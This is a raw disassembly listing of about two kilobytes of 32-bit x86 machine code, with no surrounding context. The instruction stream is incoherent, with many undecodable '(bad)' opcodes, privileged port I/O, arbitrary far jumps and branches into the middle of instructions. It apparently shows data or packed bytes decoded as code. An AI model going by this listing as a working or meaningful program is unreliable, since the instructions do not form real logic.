  44468d:	mov    DWORD PTR [esp+esi*1-0x28db1293],0xa7ff0f1e
  444698:	dec    ecx
  444699:	xchg   BYTE PTR [ebx+0xb],cl
  44469c:	mov    bl,0x2b
  44469e:	loopne 0x4446ff
  4446a0:	daa    
  4446a1:	sub    esp,eax
  4446a3:	stos   DWORD PTR es:[edi],eax
  4446a4:	xchg   edi,eax
  4446a5:	mov    ah,0x95
  4446a7:	xchg   esp,eax
  4446a8:	daa    
  4446a9:	inc    ebx
  4446aa:	loopne 0x444643
  4446ac:	daa    
  4446ad:	dec    ebp
  4446ae:	les    ecx,FWORD PTR [esi+esi*8]
  4446b1:	adc    ecx,DWORD PTR [eax]
  4446b3:	adc    eax,0xd92b1bbe
  4446b8:	push   ebx
  4446b9:	mov    eax,0xdbf61415
  4446be:	sti    
  4446bf:	push   cs
  4446c0:	out    dx,al
  4446c1:	shl    edi,cl
  4446c3:	push   ss
  4446c4:	call   0xd5491fd0
  4446c9:	stos   BYTE PTR es:[edi],al
  4446ca:	mov    BYTE PTR [eax],al
  4446cc:	add    BYTE PTR [eax],al
  4446ce:	add    BYTE PTR [eax],al
  4446d0:	ret    
  4446d1:	mov    ?,ebx
  4446d3:	add    BYTE PTR [eax+0x29],al
  4446d6:	jecxz  0x4446b7
  4446d8:	xchg   edi,eax
  4446d9:	mov    ds:0x535fb828,eax
  4446de:	ins    BYTE PTR es:[edi],dx
  4446df:	call   0x278b:0xdfd3295f
  4446e6:	jecxz  0x4446c7
  4446e8:	not    BYTE PTR [eax+0x27081540]
  4446ee:	mov    ds:0xbb6bc7df,eax
  4446f3:	fistp  WORD PTR [ebx-0x6ffc0950]
  4446f9:	sub    DWORD PTR [ebp+0x13fe0c93],ebp
  4446ff:	fcom   QWORD PTR [esi+esi*8]
  444702:	fcomi  st,st(7)
  444704:	or     al,0xf0
  444706:	sbb    eax,0xffffffe7
  444709:	shl    ch,cl
  44470b:	mov    BYTE PTR [edi+ebp*1],al
  44470e:	xor    esp,eax
  444710:	fs hlt 
  444712:	mov    al,0xb6
  444714:	hlt    
  444715:	outs   dx,BYTE PTR ds:[esi]
  444716:	cmp    ecx,DWORD PTR [eax-0x25]
  444719:	gs push cs
  44471b:	jmp    0xe953332e
  444720:	push   ss
  444721:	in     al,dx
  444722:	push   cs
  444723:	jmp    0xe9533336
  444728:	push   ss
  444729:	stc    
  44472a:	push   cs
  44472b:	jmp    0xe852f9c3
  444730:	xchg   ebx,eax
  444731:	mov    dl,0xe
  444733:	jmp    0x9300:0x0
  44473a:	mov    dl,0xe
  44473c:	out    0x93,al
  44473e:	mov    dl,0xe
  444740:	out    0x93,al
  444742:	mov    dl,0xe
  444744:	into   
  444745:	xchg   ebx,eax
  444746:	mov    dl,0xe
  444748:	out    0x93,al
  44474a:	mov    dl,0xe
  44474c:	push   ds
  44474d:	xchg   esp,eax
  44474e:	mov    dl,0xe
  444750:	xchg   esi,eax
  444751:	xchg   ebx,eax
  444752:	mov    dl,0xe
  444754:	mov    ss,WORD PTR [edx-0x6f79f14e]
  44475a:	mov    dl,0xe
  44475c:	jle    0x44478a
  44475e:	push   edx
  44475f:	jmp    0xef6d3da
  444764:	outs   dx,BYTE PTR ds:[esi]
  444765:	and    al,0x52
  444767:	jmp    0xe99683d2
  44476c:	pop    esi
  44476d:	and    al,0x52
  44476f:	jmp    0xe995e3ca
  444774:	dec    esi
  444775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444776:	push   eax
  444777:	jmp    0xe992e3c2
  44477c:	test   BYTE PTR ds:[edx-0x4583c9f2],dh
  444783:	push   cs
  444784:	test   BYTE PTR cs:[edx-0x7583d9f2],ch
  44478b:	push   cs
  44478c:	push   ds
  44478d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44478e:	retf   0x160e
  444791:	pushf  
  444792:	dec    edx
  444793:	push   cs
  444794:	push   cs
  444795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444796:	dec    edx
  444797:	str    WORD PTR [esi+0x3e6a6]
  44479e:	add    BYTE PTR [eax],al
  4447a0:	add    BYTE PTR [eax],al
  4447a2:	scas   al,BYTE PTR es:[edi]
  4447a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447a4:	out    0x7,al
  4447a6:	sahf   
  4447a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447a8:	out    0xf,al
  4447aa:	scas   al,BYTE PTR es:[edi]
  4447ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447ac:	out    0x1f,al
  4447ae:	scas   al,BYTE PTR es:[edi]
  4447af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447b0:	out    0x3f,al
  4447b2:	outs   dx,BYTE PTR ds:[esi]
  4447b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447b4:	out    0x7f,al
  4447b6:	pop    esi
  4447b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447b8:	out    0xff,al
  4447ba:	(bad)  
  4447bb:	or     al,0x3c
  4447bd:	push   ebx
  4447be:	in     eax,dx
  4447bf:	cmp    ebp,esi
  4447c1:	inc    eax
  4447c2:	sub    eax,0x81245dd1
  4447c7:	shl    DWORD PTR [edi+0x1c],1
  4447ca:	repnz or al,0xd
  4447cd:	mov    esp,DWORD PTR [edi-0x48]
  4447d0:	mov    esi,0x90512383
  4447d5:	inc    esp
  4447d6:	push   ebp
  4447d7:	jno    0x444769
  4447d9:	push   esp
  4447da:	push   ebp
  4447db:	dec    ecx
  4447dc:	xchg   edx,eax
  4447dd:	ins    BYTE PTR es:[edi],dx
  4447de:	inc    ebp
  4447df:	and    DWORD PTR [edx+0x47d0494e],edx
  4447e5:	or     al,0x52
  4447e7:	scas   al,BYTE PTR es:[edi]
  4447e8:	(bad)  
  4447ea:	sub    dh,BYTE PTR [eax-0x49d71698]
  4447f0:	push   cs
  4447f1:	add    dl,bh
  4447f3:	(bad)  
  4447f4:	nop
  4447f5:	pop    esp
  4447f6:	xchg   ebp,eax
  4447f7:	bound  edx,QWORD PTR [eax-0x6f916a94]
  4447fd:	dec    esp
  4447fe:	test   DWORD PTR [esi-0x6e],eax
  444801:	inc    edi
  444802:	cmp    eax,0x5056d0
  444807:	add    BYTE PTR [eax],al
  444809:	add    BYTE PTR [eax],al
  44480b:	jo     0x444887
  44480d:	sub    eax,0x2d727008
  444812:	or     al,0x71
  444814:	mov    bh,0xe
  444816:	add    BYTE PTR [ecx-0x6faba931],bh
  44481c:	mov    WORD PTR [edx],?
  44481e:	inc    edi
  44481f:	or     DWORD PTR [edi-0xf],edx
  444822:	mov    bh,0x91
  444824:	pop    ebx
  444825:	or     eax,0xb5201b00
  44482a:	int3   
  44482b:	mov    al,0x12
  44482d:	push   0x43
  44482f:	je     0x444888
  444831:	push   0xccc46840
  444836:	das    
  444837:	sbb    ecx,DWORD PTR [ecx-0x4233793a]
  44483d:	mov    BYTE PTR [esi-0x793d4a34],0xdc
  444844:	mov    ebp,0xb1ff84da
  444849:	imul   ebx,DWORD PTR [eax-0x5c],0xac2381d4
  444850:	aam    0xa9
  444852:	and    edi,DWORD PTR [esp+edx*2+0x4f]
  444856:	jo     0x4448ca
  444858:	fcom   QWORD PTR [edx+0x4]
  44485b:	jnp    0x444874
  44485d:	push   ebp
  44485e:	or     edx,DWORD PTR [eax+0x51250d59]
  444864:	(bad)  
  444865:	cdq    
  444866:	and    ecx,DWORD PTR [esp+ecx*8+0xd588471]
  44486d:	dec    ebp
  44486e:	in     al,dx
  44486f:	add    BYTE PTR [eax],al
  444871:	add    BYTE PTR [eax],al
  444873:	add    dl,ch
  444875:	out    dx,al
  444876:	and    DWORD PTR [ebx],0x2381c274
  44487c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44487d:	in     al,0xf5
  44487f:	lock into 
  444881:	pop    esp
  444882:	or     eax,0xdd659000
  444887:	sub    al,0xd0
  444889:	ret    
  44488a:	pop    ss
  44488b:	inc    edx
  44488c:	sbb    eax,DWORD PTR [ebp-0x53674370]
  444892:	sub    eax,0x5f4e804
  444897:	test   BYTE PTR [edx+esi*4-0x25],dl
  44489b:	iret   
  44489c:	dec    esp
  44489d:	lea    esi,[edi-0xa4dac5d]
  4448a3:	add    dl,BYTE PTR [edx+edi*1]
  4448a6:	cmc    
  4448a7:	add    edx,DWORD PTR [eax+0x5cb37cc7]
  4448ad:	loope  0x444834
  4448af:	outs   dx,DWORD PTR ds:[esi]
  4448b0:	or     al,0xb7
  4448b2:	fild   DWORD PTR [ebx+eiz*2+0x7003f796]
  4448b9:	mov    dl,0x92
  4448bb:	jo     0x4448a2
  4448bd:	and    DWORD PTR [edi-0x487c2c68],0x1
  4448c4:	push   ds
  4448c5:	xor    DWORD PTR [ecx+ecx*8-0x68d51f0e],edi
  4448cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4448cd:	xor    esi,ecx
  4448cf:	mov    ds:0x9753d5e3,al
  4448d4:	scas   eax,DWORD PTR es:[edi]
  4448d5:	xor    DWORD PTR [ebp+0x9b],ebx
  4448db:	add    BYTE PTR [eax],al
  4448dd:	jmp    0x77db67b7
  4448e2:	or     dh,dh
  4448e4:	add    edx,DWORD PTR [eax-0x19a0f4e]
  4448ea:	pop    ecx
  4448eb:	out    dx,eax
  4448ec:	test   BYTE PTR [edi-0x41],dl
  4448ef:	je     0x4448fd
  4448f1:	xchg   ecx,eax
  4448f2:	(bad)
  4448f5:	in     eax,0xb1
  4448f7:	test   DWORD PTR [ebx+0x1cf5c61f],0xc3fa778b
  444901:	outs   dx,DWORD PTR ds:[esi]
  444902:	div    bh
  444904:	add    eax,0x1cf7b290
  444909:	xchg   ebp,eax
  44490a:	ja     0x4448fe
  44490c:	ret    
  44490d:	push   edi
  44490e:	div    bh
  444910:	add    al,0x90
  444912:	mov    dl,0xf7
  444914:	lods   eax,DWORD PTR ds:[esi]
  444915:	ds jmp 0x444926
  444918:	xchg   ecx,eax
  444919:	jl     0x44494d
  44491b:	jle    0x444986
  44491d:	test   DWORD PTR [edx+0xee4f461],edi
  444923:	jo     0x444971
  444925:	inc    esi
  444926:	jbe    0x4448b6
  444928:	sub    al,ah
  44492a:	jge    0x44491a
  44492c:	loop   0x4448c9
  44492e:	ss add cl,ch
  444931:	sub    al,0xfb
  444933:	xor    dh,cl
  444935:	lods   al,BYTE PTR ds:[esi]
  444936:	arpl   WORD PTR [ebp-0x25cadd13],dx
  44493c:	ret    
  44493d:	addr16 jle 0x44493b
  444940:	ins    DWORD PTR es:[edi],dx
  444941:	add    BYTE PTR [eax],al
  444943:	add    BYTE PTR [eax],al
  444945:	add    bl,dl
  444947:	rol    BYTE PTR [edi],0xa8
  44494a:	stos   DWORD PTR es:[edi],eax
  44494b:	mov    ebp,0x922010b4
  444950:	(bad)  
  444951:	fisttp QWORD PTR [ecx]
  444953:	lock adc ch,cl
  444956:	xchg   ebx,eax
  444957:	test   DWORD PTR [edx+0x5],esp
  44495a:	push   0x18c0d2c3
  44495f:	mov    dl,0xe
  444961:	jmp    0x9413c73a
  444966:	inc    ebx
  444967:	cmp    dh,dl
  444969:	push   ecx
  44496a:	inc    ebx
  44496b:	mov    ebx,0xb2939d92
  444970:	push   cs
  444971:	imul   esi,DWORD PTR [edx-0x46],0x655dcc62
  444978:	pop    ebp
  444979:	fsub   DWORD PTR [ebp-0x1656e2ac]
  44497f:	sbb    BYTE PTR [edx+eiz*4+0x39fe0f13],dl
  444986:	mov    bl,0xb6
  444988:	div    BYTE PTR [ebx-0x3a]
  44498b:	add    eax,0xb293e90f
  444990:	mov    ebp,0xc7983b49
  444995:	add    BYTE PTR [edx-0x512250b],bl
  44499b:	adc    DWORD PTR [eax+0x695e8d54],0x142ab6fb
  4449a5:	xor    edi,DWORD PTR [ecx+0x1b]
  4449a8:	mov    ah,0x8a
  4449aa:	add    BYTE PTR [eax],al
  4449ac:	add    BYTE PTR [eax],al
  4449ae:	add    BYTE PTR [edx+0x7a10aa31],al
  4449b4:	xchg   ecx,eax
  4449b5:	adc    ch,al
  4449b7:	xor    al,BYTE PTR ds:0xd22042d
  4449bd:	sub    eax,0x9284da0c
  4449c2:	add    al,0x38
  4449c4:	into   
  4449c5:	fld    st(1)
  4449c7:	xchg   ebx,eax
  4449c8:	inc    ecx
  4449c9:	xchg   ebx,eax
  4449ca:	int3   
  4449cb:	mov    ds:0x3edda82,eax
  4449d0:	(bad)  
  4449d1:	mov    cl,0x10
  4449d3:	jbe    0x444a0a
  4449d5:	mov    ebx,0x8eb16900
  4449da:	loope  0x444a42
  4449dc:	and    eax,0x21303a6c
  4449e1:	sbb    BYTE PTR [edx+0x66a96150],cl
  4449e7:	aam    0xc8
  4449e9:	rol    BYTE PTR [eax-0x1f25ba06],cl
  4449ef:	inc    edx
  4449f0:	test   eax,0xb7e1cd93
  4449f5:	push   cs
  4449f6:	add    BYTE PTR [ecx],ch
  4449f8:	or     cl,0x48
  4449fb:	inc    ebx
  4449fc:	sahf   
  4449fd:	or     al,ch
  4449ff:	or     dl,BYTE PTR [ebx-0x49ed3016]
  444a05:	xchg   ecx,eax
  444a06:	je     0x444a55
  444a08:	ins    DWORD PTR es:[edi],dx
  444a09:	xchg   edx,eax
  444a0a:	(bad)  
  444a0b:	mov    ds:0xb2282d7a,al
  444a10:	lock push ss
  444a12:	add    BYTE PTR [eax],0x0
  444a15:	add    BYTE PTR [eax],al
  444a17:	add    BYTE PTR [eax-0x6fffed31],dl
  444a1d:	ror    dh,1
  444a1f:	and    ecx,DWORD PTR [eax-0x1ddbfe40]
  444a25:	xlat   BYTE PTR ds:[ebx]
  444a26:	or     edi,esp
  444a28:	or     DWORD PTR [ebp+0x65],ebx
  444a2b:	add    BYTE PTR [edx],cl
  444a2d:	adc    eax,0x59668612
  444a32:	mov    ecx,es
  444a34:	xchg   ebx,eax
  444a35:	ret    
  444a36:	sar    esi,1
  444a38:	pop    ss
  444a39:	or     al,0xf
  444a3b:	jge    0x444a0c
  444a3d:	push   edi
  444a3e:	cld    
  444a3f:	mov    ds:0x2bf1cf1b,al
  444a44:	mov    ecx,0x9ff8186a
  444a49:	xlat   BYTE PTR ds:[ebx]
  444a4a:	adc    al,0xfe
  444a4c:	sbb    al,0x9e
  444a4e:	fstp   TBYTE PTR [ebx-0x4c]
  444a51:	mov    eax,ds:0xc0d7b086
  444a56:	test   eax,0x10cf9823
  444a5b:	jge    0x444ac6
  444a5d:	pop    ecx
  444a5e:	gs inc eax
  444a60:	xchg   ecx,eax
  444a61:	rcl    eax,0xfd
  444a64:	setne  BYTE PTR ds:0xfc5e577d
  444a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444a6c:	imul   esi,DWORD PTR [edx+0x1b],0xcde24ff8
  444a73:	or     BYTE PTR ds:0x90000c5c,cl
  444a79:	loope  0x444a8d
  444a7b:	add    BYTE PTR [eax],al
  444a7d:	add    BYTE PTR [eax],al
  444a7f:	add    BYTE PTR [eax],al
  444a81:	nop
  444a82:	pop    ecx
  444a83:	sbb    al,0xdf
  444a85:	fdivr  DWORD PTR [eax+0x56]
  444a88:	cld    
  444a89:	push   ecx
  444a8a:	shl    DWORD PTR [ecx+0x11d08823],0x7e
  444a91:	sub    DWORD PTR [eax-0x4cf007e5],eax
  444a97:	jg     0x444a5c
  444a99:	cwde   
  444a9a:	xor    eax,0xb2900155
  444a9f:	jg     0x444aa5
  444aa1:	nop
  444aa2:	mov    dl,0xf7
  444aa4:	xor    cl,bh
  444aa6:	cli    
  444aa7:	adc    al,0x49
  444aa9:	in     al,0x71
  444aab:	pop    esp
  444aac:	mov    bh,0xb3
  444aae:	mov    esi,0x5956076c
  444ab3:	mov    esi,0x5c4bc80e
  444ab8:	cmp    ecx,DWORD PTR [edi+esi*8]
  444abb:	rcl    edi,cl
  444abd:	shr    BYTE PTR [ecx+0x6c],0x97
  444ac1:	jae    0x444a4d
  444ac3:	mov    esp,0x31309841
  444ac8:	add    DWORD PTR [eax+0x1c39f4b2],edx
  444ace:	into   
  444acf:	fcmovnbe st,st(3)
  444ad1:	xchg   edi,eax
  444ad2:	(bad)  
  444ad3:	rcr    edx,cl
  444ad5:	dec    esi
  444ad6:	scas   eax,DWORD PTR es:[edi]
  444ad7:	(bad)  
  444ad8:	jns    0x444aad
  444ada:	xchg   esi,eax
  444adb:	bswap  ecx
  444add:	les    edx,FWORD PTR ds:[edi-0x27]
  444ae1:	ss aas 
  444ae3:	xchg   ebx,eax
  444ae4:	jns    0x444ae6
  444ae6:	add    BYTE PTR [eax],al
  444ae8:	add    BYTE PTR [eax],al
  444aea:	pusha  
  444aeb:	xchg   edi,eax
  444aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444aed:	sbb    ecx,eax
  444aef:	xchg   DWORD PTR [esi-0x4968326a],esi
  444af5:	adc    DWORD PTR [ebx],esi
  444af7:	aaa    
  444af8:	mov    al,ds:0x1f573dd9
  444afd:	jns    0x444ad2
  444aff:	xchg   esi,eax
  444b00:	(bad)  
  444b01:	enter  0xc457,0xd3
  444b05:	add    BYTE PTR [esi+edx*4-0x68dfff3d],bh
  444b0c:	data16 (bad) [edi+0x37]
  444b10:	xor    ebp,eax
  444b12:	xchg   DWORD PTR [edi-0x670157f2],eax
  444b18:	xor    eax,0x950fa1a8
  444b1d:	fucomp st(7)
  444b1f:	adc    BYTE PTR [ebp+0x259af7ad],0x28
  444b26:	push   ds
  444b27:	test   eax,0xf812835
  444b2c:	xchg   ebp,eax
  444b2d:	ds leave 
  444b2f:	pop    esp
  444b30:	cmc    
  444b31:	aad    0x90
  444b33:	inc    edx
  444b34:	xor    eax,0x32ef5938
  444b39:	rcr    eax,1
  444b3b:	or     esp,DWORD PTR [eax-0xf]
  444b3e:	call   0x398a284e
  444b43:	inc    edx
  444b44:	xor    eax,0xdd73391b
  444b49:	inc    ebp
  444b4a:	sub    DWORD PTR [edi+0xd532],edi
  444b50:	add    BYTE PTR [eax],al
  444b52:	add    BYTE PTR [edx-0x73011743],cl
  444b58:	ss jmp 0x78fe4844
  444b5e:	and    al,0x9
  444b60:	dec    edi
  444b61:	sbb    DWORD PTR [edi+0x78],edx
  444b64:	xchg   esi,eax
  444b65:	sbb    DWORD PTR [esi-0x4f],ebx
  444b68:	mov    edx,0xb6684578
  444b6d:	sbb    DWORD PTR [esi-0x76],ecx
  444b70:	mov    edx,0xede8b0f9
  444b75:	xor    dh,cl
  444b77:	js     0x444bc1
  444b79:	cdq    
  444b7a:	out    0xa0,al
  444b7c:	or     BYTE PTR [ebp-0x33ccc54],cl
  444b82:	cmc    
  444b83:	and    eax,0x4e0f1945
  444b88:	(bad)  
  444b89:	shr    ch,1
  444b8b:	xor    al,0x57
  444b8d:	call   0x19ee21fc
  444b92:	add    BYTE PTR [edx],al
  444b94:	out    dx,eax
  444b95:	push   ss
  444b96:	fisttp DWORD PTR [ecx]
  444b98:	inc    edi
  444b99:	addr16 loopne 0x444bca
  444b9c:	aaa    
  444b9d:	lds    ecx,FWORD PTR [ebx-0x49e9cd0b]
  444ba3:	mov    ebp,0xa2c97746
  444ba8:	lods   eax,DWORD PTR ds:[esi]
  444ba9:	(bad)  
  444baa:	rcl    ah,0x5c
  444bad:	test   al,0xe8
  444baf:	jmp    0x95c06c9f
  444bb4:	ds push ss
  444bb6:	xchg   BYTE PTR [eax],al
  444bb8:	add    BYTE PTR [eax],al
  444bba:	add    BYTE PTR [eax],al
  444bbc:	mov    ebp,0xe0000eb3
  444bc1:	and    DWORD PTR ds:0xf0fc0614,ebp
  444bc7:	adc    DWORD PTR [ebx+0x798b0eb5],edi
  444bcd:	hlt    
  444bce:	repz adc BYTE PTR [ecx+0x45],dl
  444bd2:	push   ss
  444bd3:	test   BYTE PTR [ecx+0x3a000eb5],bl
  444bd9:	xchg   ebp,eax
  444bda:	push   ss
  444bdb:	je     0x444ba2
  444bdd:	inc    esi
  444bde:	fcmovb st,st(1)
  444be0:	scas   al,BYTE PTR es:[edi]
  444be1:	daa    
  444be2:	ror    DWORD PTR [edi],1
  444be4:	push   esp
  444be6:	xor    ch,al
  444be8:	call   0xe971:0x5ea08c4a
  444bef:	add    bh,BYTE PTR [eax]
  444bf1:	dec    ebp
  444bf2:	fcmovb st,st(1)
  444bf4:	cli    
  444bf5:	mov    ebx,0x4c4b7709
  444bfa:	ja     0x444bf1
  444bfc:	outs   dx,BYTE PTR ds:[esi]
  444bfd:	sub    esp,DWORD PTR [edi]
  444bff:	and    DWORD PTR [edi],0xffffffb2
  444c02:	pop    ss
  444c03:	repz push DWORD PTR [eax]
  444c06:	int3   
  444c07:	and    BYTE PTR [esi],bh
  444c09:	test   al,0xce
  444c0b:	mov    edi,DWORD PTR [ebp+0x52]
  444c0e:	adc    eax,0xa04900f
  444c13:	or     BYTE PTR [esi+0x3d78e533],ch
  444c19:	les    ecx,FWORD PTR [esi]
  444c1b:	jge    0x444bac
  444c1d:	and    DWORD PTR [esi],0x84
  444c23:	add    BYTE PTR [eax],al
  444c25:	cmp    BYTE PTR [edx],bl
  444c27:	or     DWORD PTR [edi],ecx
  444c29:	mov    ebx,0xd969e532
  444c2e:	and    ah,dl
  444c30:	or     BYTE PTR [edi+esi*1],dl
  444c33:	adc    al,BYTE PTR [eax]
  444c35:	nop
  444c36:	fdiv   QWORD PTR [edx]
  444c38:	or     BYTE PTR [eax+eax*1-0x1c],ah
  444c3c:	int3   
  444c3d:	sar    DWORD PTR [edi],1
  444c3f:	xchg   edi,eax
  444c41:	(bad)
  444c45:	call   0xf0c73305
  444c4a:	xchg   edi,eax
  444c4b:	sar    edi,1
  444c4d:	xchg   edx,eax
  444c4e:	repnz imul esi,DWORD PTR [ebx+0x74],0x77
  444c53:	push   0xc9176bc0
  444c58:	daa    
  444c59:	imul   ebx,DWORD PTR [ebp+eiz*8+0xd5af97d],0x0
  444c61:	or     eax,DWORD PTR [ebp+0x4c6bf069]
  444c67:	nop
  444c68:	out    0x93,al
  444c6a:	ror    DWORD PTR [eax+ecx*4],cl
  444c6d:	pop    ebx
  444c6f:	iret   
  444c70:	dec    BYTE PTR [ecx]
  444c72:	adc    BYTE PTR [eax],0x7d
  444c75:	dec    esi
  444c76:	pop    ebp
  444c77:	gs inc eax
  444c79:	xchg   ecx,eax
  444c7a:	rcr    DWORD PTR [ebp+edi*8-0x12efe6ee],1
  444c81:	xor    al,0xc5
  444c83:	cdq    
  444c84:	and    esp,DWORD PTR [esp+edx*8+0x23b1]
  444c8b:	add    BYTE PTR [eax],al
  444c8d:	add    BYTE PTR [eax+0x47f8c672],bl
  444c93:	mov    bl,0xb0
  444c95:	js     0x444c6d
  444c97:	mov    dl,0x74
  444c99:	push   cs
  444c9a:	ss mov edi,0x8eabcc3f
  444ca0:	iret   
  444ca1:	(bad)  
  444ca2:	cmc    
  444ca3:	neg    DWORD PTR [ebp+edi*1+0x15]
  444ca7:	mov    al,0x74
  444ca9:	sbb    al,0x14
  444cab:	xor    BYTE PTR [eax],bh
  444cad:	add    eax,0x7bf5f018
  444cb2:	push   eax
  444cb3:	mov    bl,0x74
  444cb5:	inc    edx
  444cb6:	xchg   ebx,eax
  444cb7:	inc    ebx
  444cb8:	jge    0x444d38
  444cba:	pop    ebx
  444cbb:	mov    gs,edi
  444cbd:	sbb    al,0xef
  444cbf:	dec    eax
  444cc0:	pop    eax
  444cc1:	or     cl,BYTE PTR [eax+ecx*2]
  444cc4:	jg     0x444c89
  444cc6:	mov    BYTE PTR ds:0xb2900309,ch
  444ccc:	je     0x444cf1
  444cce:	cwde   
  444ccf:	mov    bh,0x4
  444cd1:	inc    esp
  444cd2:	cwde   
  444cd3:	enter  0xe636,0x8b
  444cd7:	sub    eax,0xb2740a57
  444cdc:	hlt    
  444cdd:	cmp    eax,0x1c6caf14
  444ce2:	fisttp DWORD PTR [eax+0x10]
  444ce5:	or     dl,BYTE PTR [eax+ecx*2]
  444ce8:	aas    
  444ce9:	ret    
  444cea:	mov    BYTE PTR ds:0xb2900351,ch
  444cf0:	je     0x444d15
  444cf2:	add    BYTE PTR [eax],al
  444cf4:	add    BYTE PTR [eax],al
  444cf6:	add    BYTE PTR [eax-0x77bc5b49],bl
  444cfc:	enter  0xe5b6,0x8b
  444d00:	sub    eax,0xb2ac0997
  444d05:	ins    BYTE PTR es:[edi],dx
  444d06:	shl    BYTE PTR [ebx+0x143cf4b6],0xae
  444d0d:	pop    edi
  444d0e:	sbb    edi,DWORD PTR [esi+0x47]
  444d11:	push   cs
  444d12:	mov    dh,0x99
  444d14:	cs jmp 0x5272d17c
  444d1a:	int    0x4f
  444d1c:	inc    edx
  444d1d:	(bad)  
  444d1e:	jb     0x444d40
  444d20:	xchg   ebx,eax
  444d21:	es rcl ah,cl
  444d24:	mov    edx,0xb28c4b8c
  444d29:	push   cs
  444d2a:	jmp    0x4743:0xc56ac65c
  444d31:	(bad)  
  444d32:	leave  
  444d33:	in     al,dx
  444d34:	pop    es
  444d35:	or     eax,0x6077d579
  444d3a:	rcr    esp,0x77
  444d3d:	fld    QWORD PTR [ebp+0x5a354275]
  444d43:	(bad)  
  444d44:	stc    
  444d45:	and    eax,0x35ed0238
  444d4a:	sbb    BYTE PTR [ebp-0x4ac96aed],al
  444d50:	push   ebp
  444d51:	cmc    
  444d52:	test   eax,0xf932f34c
  444d57:	aam    0x6e
  444d59:	pusha  
  444d5a:	rol    DWORD PTR [eax],1
  444d5c:	add    BYTE PTR [eax],al
  444d5e:	add    BYTE PTR [eax],al
  444d60:	xchg   esp,eax
  444d61:	mov    esi,0x428cd532
  444d66:	xor    eax,0x256ecd18
  444d6b:	cmp    BYTE PTR [edx],al
  444d6d:	lea    esi,ds:0x95138518
  444d73:	jne    0x444d2c
  444d75:	jle    0x444d0c
  444d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444d78:	outs   dx,DWORD PTR ds:[esi]
  444d79:	xchg   esi,eax
  444d7a:	and    eax,0x35a02218
  444d7f:	mov    eax,0xd69511a4
  444d84:	push   esp
  444d85:	push   edi
  444d86:	cmc    
  444d87:	stc    
  444d88:	xchg   esp,eax
  444d89:	inc    edx
  444d8a:	xor    eax,0x607554d8
  444d8f:	add    BYTE PTR [ecx+0x67],ah
  444d92:	fdiv   st,st(3)
  444d94:	or     eax,0xa2bdec7
  444d99:	(bad)  
  444d9a:	shl    ebx,cl
  444d9c:	or     eax,0x65245dc7
  444da1:	mov    DWORD PTR [ebp+0x24],0xfe2da941
  444da8:	push   es
  444da9:	mov    ebx,0x6f1698a0
  444dae:	jmp    0xef6816c
  444db3:	add    BYTE PTR [edx],al
  444db5:	pop    esi
  444db6:	mov    cl,0x20
  444db8:	or     eax,0xf900a03e
  444dbd:	mov    cl,0xe
  444dbf:	mov    edx,0xeb202
  444dc4:	add    BYTE PTR [eax],al
  444dc6:	add    BYTE PTR [eax],al
  444dc8:	add    BYTE PTR [edx+0x4d],ah
  444dcb:	mov    al,ds:0xe96e4694
  444dd0:	mov    ecx,0xeb1e3
  444dd5:	inc    edx
  444dd6:	inc    ecx
  444dd7:	xchg   edx,eax
  444dd8:	je     0x444d67
  444dda:	push   0xffffffa0
  444ddc:	pushf  
  444ddd:	xchg   BYTE PTR [esi-0x17],ch
  444de0:	mov    ecx,0xeb1e3
  444de5:	mov    ds:0xcd4493b1,al
  444dea:	sbb    DWORD PTR [ecx+ecx*8+0x4891af0d],ecx
  444df1:	mov    eax,ds:0x201c29c6
  444df6:	inc    ecx
  444df7:	repnz add BYTE PTR [edx],ch
  444dfa:	ins    BYTE PTR es:[edi],dx
  444dfb:	sub    DWORD PTR [eax+0x3d],esp
  444dfe:	mov    cl,0xe8
  444e00:	je     0x444e7d
  444e02:	mov    ah,0x8b
  444e05:	lods   eax,DWORD PTR ds:[esi]
  444e06:	push   edx
  444e07:	inc    ecx
  444e08:	mov    eax,DWORD PTR [edx-0x37]
  444e0b:	pop    ecx
  444e0c:	sbb    al,0x90
  444e0e:	sbb    cl,BYTE PTR [ebx]
  444e10:	cld    
  444e11:	mov    edx,0x93de536a
  444e16:	mov    al,ds:0x57d8863b
  444e1b:	push   0x55
  444e1d:	mov    eax,ss
  444e1f:	and    eax,0xf6afe48a
  444e24:	fdiv   QWORD PTR ss:[edi-0x7]
  444e28:	jb     0x444dc6
  444e2a:	pusha  
  444e2b:	cld    
  444e2c:	add    DWORD PTR [eax],0x0
  444e2f:	add    BYTE PTR [eax],al
  444e31:	add    BYTE PTR [eax+0x7c23b6d2],cl
  444e37:	pop    eax
  444e38:	cld    
  444e39:	cmp    DWORD PTR [eax-0x741b73a9],0x5a
  444e40:	mov    cl,0x23
  444e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444e43:	rol    dl,cl
  444e45:	mov    ah,0x91
  444e47:	pop    ebx
  444e48:	or     eax,0xa5f7e300
  444e4d:	jl     0x444e04
  444e4f:	sbb    ebp,DWORD PTR [ebp+0x7e599043]
  444e55:	pop    es
  444e56:	xchg   edi,eax
  444e57:	mov    BYTE PTR [ebx+0x8],dl
  444e5a:	pop    esi
  444e5b:	xchg   esi,eax
  444e5c:	loope  0x444ece
  444e5e:	mov    bl,0xe0
  444e60:	imul   esp,DWORD PTR [ebp-0x78],0xffffffd0
  444e64:	mov    dh,0x23
  444e66:	pushf  
  444e67:	inc    eax
  444e68:	xor    esi,DWORD PTR [ecx-0x76]
  444e6b:	pusha  
  444e6c:	xor    edi,DWORD PTR [ebx+edx*8+0x3f]
  444e70:	push   0x57
  444e72:	xchg   esp,eax
  444e73:	mov    al,0xe4
  444e75:	and    al,0xa3
  444e77:	fwait
  444e78:	xor    BYTE PTR [esi+edx*8+0x3f],bh
